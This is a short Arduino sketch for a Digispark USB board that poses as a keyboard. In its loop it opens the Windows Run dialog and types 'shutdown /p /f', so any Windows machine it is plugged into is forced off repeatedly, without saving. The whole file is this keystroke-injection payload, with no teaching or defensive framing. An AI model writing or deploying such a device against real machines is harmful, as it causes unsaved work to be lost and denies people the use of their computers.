#include "DigiKeyboard.h"

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  // put your main code here, to run repeatedly:

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("shutdown /p /f\n");
}
